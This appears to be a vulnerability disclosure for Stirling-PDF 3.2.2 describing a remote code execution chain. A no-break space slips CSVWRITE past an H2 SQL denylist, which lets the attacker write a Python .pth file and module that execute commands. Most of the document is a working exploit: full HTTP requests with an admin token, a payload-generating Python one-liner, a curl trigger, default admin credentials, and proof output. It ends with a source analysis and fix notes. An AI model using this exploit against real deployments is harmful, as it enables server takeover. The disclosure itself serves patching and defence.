### Vulnerability details

**Official website / Product:** https://stirlingpdf.com / https://github.com/Stirling-Tools/Stirling-PDF

**Repository:** Stirling-Tools/Stirling-PDF (stars at selection: 95517)

**Vulnerability type:** RCE (H2 import-database denylist Unicode-whitespace bypass → arbitrary file write → Python user-site `.pth` getshell)

**Vulnerability versions:** 3.2.2 (Docker `stirlingtools/stirling-pdf:latest`; `/api/v1/info/status` → `{"version":"3.2.2"}`); source reviewed at `65fbfd10cad4d47511bbfe98cee5e4a750aa33ac`. `DENIED_PATTERNS` still uses Java `\s` for `CSVWRITE\s*\(` / `CREATE\s+(FORCE\s+)?ALIAS`.

**Vulnerability URL / Parameter:** `POST /api/v1/database/import-database` — multipart field `fileInput` (`.sql`). Command execution is triggered by any tool that starts `python3` without `-I`, e.g. `POST /api/v1/misc/extract-image-scans`.

**Complex:** yes

### Verification procedure

1. Bring up the lab on host port **20205** with `SECURITY_ENABLELOGIN=true` and `DOCKER_ENABLE_SECURITY=true`. Compose is below. Default admin `admin` / `stirling` (firstLogin cleared in lab DB).
2. `POST /api/v1/auth/login` for JWT (`session.access_token`; PoC §1).
3. Control: upload SQL with plain ASCII `CSVWRITE(` → HTTP 500 `disallowed operations` (PoC §2).
4. Upload SQL with **U+00A0 NO-BREAK SPACE** (bytes `C2 A0`, not a normal space) between `CSVWRITE` and `(` writing:
   - `/home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22pwn.py`
   - sibling `r22a5.pth` containing `import r22pwn`
5. Import returns HTTP **200** `importIntoDatabaseSuccessed` (PoC §3).
6. Call `POST /api/v1/misc/extract-image-scans` (or any `python3` tool) to load site customizations (PoC §4). The tool may return 500 on the tiny PNG; that does not prevent `.pth` execution.
7. Container file `/tmp/stirling-r22a5-rce.txt` holds JVM-user `id` output (`uid=1000(ubuntu)`; PoC §5).

Lab `docker-compose.yml` (complete):

```yaml
services:
  stirling-pdf:
    image: stirlingtools/stirling-pdf:latest
    container_name: stirling-r22a5
    ports:
      - "20205:8080"
    environment:
      - SECURITY_ENABLELOGIN=true
      - SYSTEM_DEFAULTLOCALE=en-US
      - DOCKER_ENABLE_SECURITY=true
      - DISABLE_ADDITIONAL_FEATURES=false
    volumes:
      - ./data/configs:/configs
      - ./data/storage:/storage
    restart: unless-stopped

```

```bash
mkdir -p stirling-r22a5/data/{configs,storage} && cd stirling-r22a5
# write the docker-compose.yml above into this directory, then:
docker compose up -d
# wait healthy; confirm version:
curl -s http://127.0.0.1:20205/api/v1/info/status
# → {"version":"3.2.2", ...}
```

### Complete vulnerability PoC

#### 1) Login for ADMIN JWT

```http
POST /api/v1/auth/login HTTP/1.1
Host: 127.0.0.1:20205
Content-Type: application/json
Content-Length: 45
Connection: close

{"username":"admin","password":"stirling"}
```

Response JSON field `session.access_token` is the Bearer used below (lab-captured value; for a fresh run use the token returned by login):

```
eyJraWQiOiJqd3Qta2V5LTIwMjYtMTEtMDEtMjAxMzUxLTMxNjhlNTI1IiwiYWxnIjoiUlMyNTYifQ.eyJyb2xlIjoiUk9MRV9BRE1JTiIsImF1dGhUeXBlIjoiV0VCIiwic3ViIjoiYWRtaW4iLCJpc3MiOiJodHRwczovL3N0aXJsaW5nLmNvbSIsImlhdCI6MTc5MzU2NTM2NywiZXhwIjoxNzkzNjUxNzY3fQ.FURWWELJE1G8Y3gCRjIgLj1sN5VG6_dlkpD1iNwSBSIMUUdm6kC1tPuPDEV9ukPta0z5g0UaEs7ZYPNFj8JARvFLCKxdROtDR92h8skDoNxYgWQFYhhQt5-mG6HzWGHeAKPWws0ilAqqjTo0K57yB_A1iRYQ-urxy_UBcbkpJXJLMsnfsDUDUW1ytG1KnXvr4cFKnjdjnJ9wkTzUl89OtKakfADC2QgCG6dBhbydxKzKcFqWvZS8kadGAHy6sXDjgYO1sH9K27jnCpJNeYWhho1TXxaPe3hnx6ikJVm3RdFud-avMMMgCoQQOg3ZFO0tJDLSi8n759ZSQQA5IgcJUg
```

#### 2) Control: plain `CSVWRITE(` rejected by denylist

Complete HTTP request:

```http
POST /api/v1/database/import-database HTTP/1.1
Host: 127.0.0.1:20205
Authorization: Bearer eyJraWQiOiJqd3Qta2V5LTIwMjYtMTEtMDEtMjAxMzUxLTMxNjhlNTI1IiwiYWxnIjoiUlMyNTYifQ.eyJyb2xlIjoiUk9MRV9BRE1JTiIsImF1dGhUeXBlIjoiV0VCIiwic3ViIjoiYWRtaW4iLCJpc3MiOiJodHRwczovL3N0aXJsaW5nLmNvbSIsImlhdCI6MTc5MzU2NTM2NywiZXhwIjoxNzkzNjUxNzY3fQ.FURWWELJE1G8Y3gCRjIgLj1sN5VG6_dlkpD1iNwSBSIMUUdm6kC1tPuPDEV9ukPta0z5g0UaEs7ZYPNFj8JARvFLCKxdROtDR92h8skDoNxYgWQFYhhQt5-mG6HzWGHeAKPWws0ilAqqjTo0K57yB_A1iRYQ-urxy_UBcbkpJXJLMsnfsDUDUW1ytG1KnXvr4cFKnjdjnJ9wkTzUl89OtKakfADC2QgCG6dBhbydxKzKcFqWvZS8kadGAHy6sXDjgYO1sH9K27jnCpJNeYWhho1TXxaPe3hnx6ikJVm3RdFud-avMMMgCoQQOg3ZFO0tJDLSi8n759ZSQQA5IgcJUg
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR22A5control
Content-Length: 340
Connection: close

------WebKitFormBoundaryR22A5control
Content-Disposition: form-data; name="fileInput"; filename="control-denied.sql"
Content-Type: application/sql

CREATE TABLE IF NOT EXISTS rce_scratch(n INT);
INSERT INTO rce_scratch VALUES(CSVWRITE('/tmp/should-deny.txt', 'SELECT ''x''', 'charset=UTF-8'));

------WebKitFormBoundaryR22A5control--
```

Complete HTTP response:

```http
HTTP/1.1 500 Server Error
Date: Sun, 01 Nov 2026 20:36:07 GMT
Vary: Accept-Encoding
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Request-Id: 40dbba59-8ba5-484d-99b8-da32f1583131
Cache-Control: private, no-store
Content-Type: application/json
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: DENY
Transfer-Encoding: chunked

{"error":"failedImportFile","message":"Failed to import database: SQL script contains disallowed operations and was rejected."}

```

#### 3) Exploit: `CSVWRITE` + U+00A0 bypass → arbitrary file write

**Note:** Between `CSVWRITE` and `(` below is **U+00A0 (NO-BREAK SPACE, UTF-8 `C2 A0`)** — do not normalize to ASCII space. Generate the same `.sql` with:

```bash
python3 -c "open('exploit-nbsp-csvwrite.sql','wb').write(
b\"CREATE TABLE IF NOT EXISTS rce_scratch(n INT);\\n\"
b\"INSERT INTO rce_scratch VALUES(CSVWRITE\\xc2\\xa0('/home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22pwn.py', 'SELECT ''__import__(''''os'''').system(''''id>/tmp/stirling-r22a5-rce.txt'''')''', 'charset=UTF-8 fieldDelimiter= writeColumnHeader=false'));\\n\"
b\"INSERT INTO rce_scratch VALUES(CSVWRITE\\xc2\\xa0('/home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22a5.pth', 'SELECT ''import r22pwn''', 'charset=UTF-8 fieldDelimiter= writeColumnHeader=false'));\\n\"
)"
```

Complete HTTP request (Docker-verified):

```http
POST /api/v1/database/import-database HTTP/1.1
Host: 127.0.0.1:20205
Authorization: Bearer eyJraWQiOiJqd3Qta2V5LTIwMjYtMTEtMDEtMjAxMzUxLTMxNjhlNTI1IiwiYWxnIjoiUlMyNTYifQ.eyJyb2xlIjoiUk9MRV9BRE1JTiIsImF1dGhUeXBlIjoiV0VCIiwic3ViIjoiYWRtaW4iLCJpc3MiOiJodHRwczovL3N0aXJsaW5nLmNvbSIsImlhdCI6MTc5MzU2NTM2NywiZXhwIjoxNzkzNjUxNzY3fQ.FURWWELJE1G8Y3gCRjIgLj1sN5VG6_dlkpD1iNwSBSIMUUdm6kC1tPuPDEV9ukPta0z5g0UaEs7ZYPNFj8JARvFLCKxdROtDR92h8skDoNxYgWQFYhhQt5-mG6HzWGHeAKPWws0ilAqqjTo0K57yB_A1iRYQ-urxy_UBcbkpJXJLMsnfsDUDUW1ytG1KnXvr4cFKnjdjnJ9wkTzUl89OtKakfADC2QgCG6dBhbydxKzKcFqWvZS8kadGAHy6sXDjgYO1sH9K27jnCpJNeYWhho1TXxaPe3hnx6ikJVm3RdFud-avMMMgCoQQOg3ZFO0tJDLSi8n759ZSQQA5IgcJUg
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR22A5exploit
Content-Length: 704
Connection: close

------WebKitFormBoundaryR22A5exploit
Content-Disposition: form-data; name="fileInput"; filename="exploit-nbsp-csvwrite.sql"
Content-Type: application/sql

CREATE TABLE IF NOT EXISTS rce_scratch(n INT);
INSERT INTO rce_scratch VALUES(CSVWRITE ('/home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22pwn.py', 'SELECT ''__import__(''''os'''').system(''''id>/tmp/stirling-r22a5-rce.txt'''')''', 'charset=UTF-8 fieldDelimiter= writeColumnHeader=false'));
INSERT INTO rce_scratch VALUES(CSVWRITE ('/home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22a5.pth', 'SELECT ''import r22pwn''', 'charset=UTF-8 fieldDelimiter= writeColumnHeader=false'));

------WebKitFormBoundaryR22A5exploit--

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 20:36:07 GMT
Vary: Accept-Encoding
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Request-Id: 52087489-e76f-464a-bbc0-f33cc26c8951
Cache-Control: private, no-store
Content-Type: application/json
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: DENY
Connection: close

{"description":"Database imported successfully","message":"importIntoDatabaseSuccessed"}

```

#### 4) Trigger: any non-`-I` python3 tool (extract-image-scans)

`fileInput` is a 1×1 PNG (70 bytes; hex `89504e470d0a1a0a0000000d4948445200000001000000010802000000907753de0000000c4944415408d763f8cfc0d0000003010001e4c6c9b80000000049454e44ae426082`; base64 `iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVQI12P4z8DQAAADAQAB5MbJuAAAAABJRU5ErkJggg==`). Recommended curl repro:

```bash
echo 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVQI12P4z8DQAAADAQAB5MbJuAAAAABJRU5ErkJggg==' | base64 -d > tiny.png
curl -s -H "Authorization: Bearer $TOKEN" \
  -F fileInput=@tiny.png \
  -F angleThreshold=5 -F tolerance=20 -F minArea=100 -F minContourArea=100 -F borderSize=0 \
  http://127.0.0.1:20205/api/v1/misc/extract-image-scans
```

Equivalent complete HTTP request (PNG body is the 70-byte binary above):

```http
POST /api/v1/misc/extract-image-scans HTTP/1.1
Host: 127.0.0.1:20205
Authorization: Bearer eyJraWQiOiJqd3Qta2V5LTIwMjYtMTEtMDEtMjAxMzUxLTMxNjhlNTI1IiwiYWxnIjoiUlMyNTYifQ.eyJyb2xlIjoiUk9MRV9BRE1JTiIsImF1dGhUeXBlIjoiV0VCIiwic3ViIjoiYWRtaW4iLCJpc3MiOiJodHRwczovL3N0aXJsaW5nLmNvbSIsImlhdCI6MTc5MzU2NTM2NywiZXhwIjoxNzkzNjUxNzY3fQ.FURWWELJE1G8Y3gCRjIgLj1sN5VG6_dlkpD1iNwSBSIMUUdm6kC1tPuPDEV9ukPta0z5g0UaEs7ZYPNFj8JARvFLCKxdROtDR92h8skDoNxYgWQFYhhQt5-mG6HzWGHeAKPWws0ilAqqjTo0K57yB_A1iRYQ-urxy_UBcbkpJXJLMsnfsDUDUW1ytG1KnXvr4cFKnjdjnJ9wkTzUl89OtKakfADC2QgCG6dBhbydxKzKcFqWvZS8kadGAHy6sXDjgYO1sH9K27jnCpJNeYWhho1TXxaPe3hnx6ikJVm3RdFud-avMMMgCoQQOg3ZFO0tJDLSi8n759ZSQQA5IgcJUg
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR22A5trigger
Content-Length: 727
Connection: close

------WebKitFormBoundaryR22A5trigger
Content-Disposition: form-data; name="fileInput"; filename="tiny.png"
Content-Type: image/png

<70-byte 1x1 PNG binary; reconstruct from hex/base64 above>
------WebKitFormBoundaryR22A5trigger
Content-Disposition: form-data; name="angleThreshold"

5
------WebKitFormBoundaryR22A5trigger
Content-Disposition: form-data; name="tolerance"

20
------WebKitFormBoundaryR22A5trigger
Content-Disposition: form-data; name="minArea"

100
------WebKitFormBoundaryR22A5trigger
Content-Disposition: form-data; name="minContourArea"

100
------WebKitFormBoundaryR22A5trigger
Content-Disposition: form-data; name="borderSize"

0
------WebKitFormBoundaryR22A5trigger--
```

Complete HTTP response (tool fails on the tiny image with HTTP 500, but user-site `.pth` already ran):

```http
HTTP/1.1 500
Date: Sun, 01 Nov 2026 20:36:51 GMT
Vary: Accept-Encoding
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Request-Id: 26bf02d9-84eb-418b-88f9-a0846fba8523
Cache-Control: private, no-store
Content-Type: application/json
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
X-Frame-Options: DENY
Connection: close

{"error":"Job failed: java.io.IOException: Command process failed with exit code 1. Error message: libpng error: IDAT: CRC error\nTraceback (most recent call last):\n  File \"/app/./configs/scripts/python/split_photos.py\", line 122, in <module>\n    split_photos(args.input_file, args.output_directory, tolerance=args.tolerance, min_area=args.min_area, min_contour_area=args.min_contour_area, angle_threshold=args.angle_threshold, border_size=args.border_size)\n  File \"/app/./configs/scripts/python/split_photos.py\", line 80, in split_photos\n    background_color = estimate_background_color(image)\n                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/app/./configs/scripts/python/split_photos.py\", line 25, in estimate_background_color\n    h, w, _ = image.shape\n              ^^^^^^^^^^^\nAttributeError: 'NoneType' object has no attribute 'shape'"}

```

#### 5) Impact proof (in container)

```bash
docker exec stirling-r22a5 cat /tmp/stirling-r22a5-rce.txt
docker exec stirling-r22a5 ls -la /home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22a5.pth /home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22pwn.py
```

Expected output (Docker-verified):

```
-rw-r--r-- 1 ubuntu ubuntu 54 Nov  1 20:36 /tmp/stirling-r22a5-rce.txt
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)

-rw-r--r-- 1 ubuntu ubuntu 14 Nov  1 20:36 /home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22a5.pth
-rw-r--r-- 1 ubuntu ubuntu 58 Nov  1 20:36 /home/stirlingpdfuser/.local/lib/python3.12/site-packages/r22pwn.py
```

Written file contents:

- `r22a5.pth` → `import r22pwn\n`
- `r22pwn.py` → `__import__('os').system('id>/tmp/stirling-r22a5-rce.txt')\n`
- `/tmp/stirling-r22a5-rce.txt` → `uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)`

Verification result notes:

- Control `CSVWRITE(` is rejected; `CSVWRITE\u00a0(` returns 200 and RUNSCRIPT succeeds.
- `r22pwn.py` / `r22a5.pth` land in user site-packages.
- After `extract-image-scans`, `/tmp/stirling-r22a5-rce.txt` contains `uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)`.
- The same NBSP trick also bypasses `CREATE\u00a0ALIAS` (e.g. `FileUtils.createDirectories`); this PoC uses `CSVWRITE` for content-controlled write → getshell.

### Vulnerability analysis

`DatabaseController.import-database` (`@PreAuthorize("hasRole('ADMIN')")`) feeds uploaded SQL through `DatabaseService.validateSqlContent`, then `verifyBackup` / `RUNSCRIPT`.

`DENIED_PATTERNS` blocks dangerous H2 APIs with Java regexes including `(?i)\bCSVWRITE\s*\(` and `CREATE\s+(FORCE\s+)?ALIAS`. `sanitizeSql` collapses whitespace via `WHITESPACE_PATTERN = \s+`.

Java `Pattern` `\s` does **not** match U+00A0; H2's lexer still treats NBSP as whitespace. Payload `CSVWRITE\u00a0(` therefore:

1. Misses the denylist (`\s*` matches zero ASCII spaces; next char is NBSP, not `(`);
2. Parses as a real `CSVWRITE(...)` call in H2;
3. Writes attacker-controlled files during in-memory `verifyBackup` RUNSCRIPT and the production RUNSCRIPT.

Writing a user-site `.pth` line starting with `import ` (executed by `site`) plus a companion module yields getshell on the next non-isolated `python3` invocation. The JVM runs with `HOME=/home/stirlingpdfuser`.

Trigger / sink source (full path and line numbers):

```java
# File: app/proprietary/src/main/java/stirling/software/proprietary/security/service/DatabaseService.java
# Lines: 96-108, 529-543, 585-594
    private static final java.util.List<Pattern> DENIED_PATTERNS =
            java.util.List.of(
                    Pattern.compile("(?i)\\bCREATE\\s+(FORCE\\s+)?ALIAS\\b"),
                    // ...
                    Pattern.compile("(?i)\\bCSVWRITE\\s*\\("),
                    Pattern.compile("(?i)\\bCSVREAD\\s*\\("),
                    // ...
                    Pattern.compile("(?i)\\bSCRIPT\\s+TO\\b"));

    private void validateSqlContent(Path scriptPath) {
        String content = Files.readString(scriptPath);
        String normalizedContent = sanitizeSql(content);
        String codeOnly = stripStringLiterals(normalizedContent);
        for (Pattern deniedPattern : DENIED_PATTERNS) {
            if (deniedPattern.matcher(codeOnly).find()) {
                throw new IllegalArgumentException(
                        "SQL script contains disallowed operations and was rejected.");
            }
        }
    }

    private String sanitizeSql(String sql) {
        String intermediateSql = BLOCK_COMMENT_PATTERN.matcher(sql).replaceAll(" ");
        intermediateSql = LINE_COMMENT_PATTERN.matcher(intermediateSql).replaceAll(" ");
        intermediateSql = WHITESPACE_PATTERN.matcher(intermediateSql).replaceAll(" "); // \\s+ only
        return intermediateSql.trim();
    }
```

```java
# File: app/proprietary/src/main/java/stirling/software/proprietary/security/controller/api/DatabaseController.java
# Lines: 32-46
@PreAuthorize("hasRole('ADMIN')")
@Conditional(H2SQLCondition.class)
public class DatabaseController {
    @PostMapping(consumes = MediaType.MULTIPART_FORM_DATA_VALUE, value = "import-database")
    public ResponseEntity<?> importDatabase(@RequestParam("fileInput") MultipartFile file)
```

### Fix notes

1. Match Unicode whitespace in denylist/sanitize (e.g. `\p{Z}` / `\p{Zs}`, or an explicit NBSP/Em-space set) and NFKC-normalize between the function name and `(`.
2. Tighten `CREATE`…`ALIAS` to `CREATE\s+(OR\s+REPLACE\s+)?(FORCE\s+)?ALIAS` and cover Unicode variants of the same gap.
3. Prefer parse-then-validate (AST/tokens) over raw-text regex; or disable H2 `CSVWRITE` / `CREATE ALIAS` capabilities.
4. Invoke Python tools with `-I` and `PYTHONNOUSERSITE=1` to shrink post-write `.pth` impact.

